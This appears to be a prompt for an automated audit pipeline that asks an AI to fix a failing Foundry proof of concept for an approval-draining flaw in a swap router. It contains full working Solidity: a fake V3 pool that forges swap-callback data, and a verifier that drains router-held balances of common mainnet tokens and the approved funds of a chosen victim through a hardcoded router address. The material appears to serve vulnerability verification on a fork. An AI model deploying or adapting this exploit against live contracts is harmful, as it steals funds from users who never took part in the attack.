You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Arbitrary V3-style pools can forge callbacks and steal approved user funds
- claim: `swapUniV3` and `swapTridentCL` accept arbitrary pool addresses from the route, then authenticate callbacks only by checking `msg.sender == lastCalledPool`. The callbacks also trust the caller-controlled `data` blob to choose both `tokenIn` and `from`. A malicious pool can therefore be inserted into a route, call the callback with forged `(token, victim)` data, and make the router execute `safeTransferFrom(victim, maliciousPool, amount)` for any ERC20 the victim has approved to the router. The same primitive can pull router-held ERC20s by forging `from = address(this)`.
- impact: Any address that has approved the router can be drained without participating in the attack. Router-held ERC20 balances can also be stolen. This is direct theft, not just bad pricing or a malicious route causing the caller to lose their own intended input.
- exploit_paths: ["Attacker deploys a fake contract implementing the UniswapV3 or TridentCL `swap` entrypoint.", "Attacker submits a route whose V3/CL hop points to that fake pool.", "After `lastCalledPool` is set, the fake pool invokes `uniswapV3SwapCallback` or `tridentCLSwapCallback` with positive deltas and forged `abi.encode(token, victim)` data.", "The callback transfers the victim's approved tokens, or router-held tokens, directly to the attacker-controlled pool."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IRouteProcessor2 {
    function processRoute(
        address tokenIn,
        uint256 amountIn,
        address tokenOut,
        uint256 amountOutMin,
        address to,
        bytes calldata route
    ) external payable returns (uint256 amountOut);

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;
}

contract MaliciousV3Pool {
    address internal immutable VERIFIER;
    address internal immutable TARGET_ROUTER;

    address internal forgedToken;
    address internal forgedFrom;
    address internal beneficiary;

    constructor(address verifier_, address router_) {
        VERIFIER = verifier_;
        TARGET_ROUTER = router_;
    }

    function configure(address token_, address from_, address beneficiary_) external {
        require(msg.sender == VERIFIER, "not verifier");
        forgedToken = token_;
        forgedFrom = from_;
        beneficiary = beneficiary_;
    }

    function swap(
        address,
        bool,
        int256 amountSpecified,
        uint160,
        bytes calldata
    ) external returns (int256 amount0, int256 amount1) {
        require(msg.sender == TARGET_ROUTER, "not router");
        require(amountSpecified >= 0, "negative amount");

        uint256 amountToPull = _toUint(amountSpecified);
        IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(
            _toInt(amountToPull),
            int256(0),
            abi.encode(forgedToken, forgedFrom)
        );

        uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
        if (stolen > 0) {
            _safeTransfer(forgedToken, beneficiary, stolen);
        }

        return (_toInt(amountToPull), -_toInt(stolen));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _toUint(int256 value) internal pure returns (uint256) {
        require(value >= 0, "negative cast");
        return uint256(value);
    }

    function _toInt(uint256 value) internal pure returns (int256) {
        require(value <= uint256(type(int256).max), "int overflow");
        return int256(value);
    }
}

contract FlawVerifier {
    address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;

    address internal immutable POOL;

    address internal _profitToken;
    uint256 internal _profitAmount;

    address public configuredVictim;
    address public configuredVictimToken;

    constructor() {
        POOL = address(new MaliciousV3Pool(address(this), ROUTER));
    }

    function executeOnOpportunity() external {
        if (_profitAmount > 0) {
            return;
        }

        if (_drainRouterBalances()) {
            return;
        }

        if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
            _attemptVictimDrain(configuredVictim, configuredVictimToken);
        }
    }

    function configureVictim(address victim, address token) external {
        configuredVictim = victim;
        configuredVictimToken = token;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _drainRouterBalances() internal returns (bool) {
        address[16] memory candidates = [
            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
            0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2, // SUSHI
            0x514910771AF9Ca656af840dff83E8264EcF986CA, // LINK
            0xD533a949740bb3306d119CC777fa900bA034cd52, // CRV
            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, // stETH
            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0, // LUSD
            0x853d955aCEf822Db058eb8505911ED77F175b99e, // FRAX
            0x4Fabb145d64652a948d72533023f6E7A623C7C53, // BUSD
            0x956F47F50A910163D8BF957Cf5846D573E7f87CA, // FEI
            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e, // wstETH
            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, // YFI
            0x111111111117dC0aa78b770fA6A738034120C302  // 1INCH
        ];

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 routerBalance = IERC20(candidates[i]).balanceOf(ROUTER);
            if (routerBalance <= 1) {
                continue;
            }

            if (_attemptRouterDrain(candidates[i])) {
                return true;
            }
        }

        return false;
    }

    function _attemptRouterDrain(address token) internal returns (bool) {
        uint256 beforeBalance = IERC20(token).balanceOf(address(this));
        MaliciousV3Pool(POOL).configure(token, ROUTER, address(this));

        bytes memory route = _buildRoute(token);
        try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
            uint256 afterBalance = IERC20(token).balanceOf(address(this));
            if (afterBalance > beforeBalance) {
                _profitToken = token;
                _profitAmount = afterBalance - beforeBalance;
                return true;
            }
        } catch {}

        return false;
    }

    function _attemptVictimDrain(address victim, address token) internal returns (bool) {
        uint256 allowance = IERC20(token).allowance(victim, ROUTER);
        uint256 balance = IERC20(token).balanceOf(victim);
        uint256 amountToPull = allowance < balance ? allowance : balance;

        // A nonzero allowance and balance are strict on-chain preconditions for the victim-drain path.
        // This verifier does not guess arbitrary victims from off-chain data; the harness can opt in
        // by configuring a concrete victim/token pair and then calling executeOnOpportunity again.
        if (amountToPull == 0) {
            return false;
        }

        uint256 beforeBalance = IERC20(token).balanceOf(address(this));
        MaliciousV3Pool(POOL).configure(token, victim, address(this));

        bytes memory route = _buildForgedUserRoute(token);
        try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
            uint256 afterBalance = IERC20(token).balanceOf(address(this));
            if (afterBalance > beforeBalance) {
                _profitToken = token;
                _profitAmount = afterBalance - beforeBalance;
                return true;
            }
        } catch {}

        return false;
    }

    function _buildRoute(address token) internal view returns (bytes memory) {
        return abi.encodePacked(
            bytes1(uint8(1)),
            bytes20(token),
            bytes1(uint8(1)),
            bytes2(uint16(65535)),
            bytes1(uint8(1)),
            bytes20(POOL),
            bytes1(uint8(1)),
            bytes20(address(this))
        );
    }

    function _buildForgedUserRoute(address token) internal view returns (bytes memory) {
        return abi.encodePacked(
            bytes1(uint8(2)),
            bytes20(token),
            bytes1(uint8(1)),
            bytes2(uint16(65535)),
            bytes1(uint8(1)),
            bytes20(POOL),
            bytes1(uint8(1)),
            bytes20(address(this))
        );
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: lastcalledpool, tridentclswapcallback, abi.encode(token, victim)
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
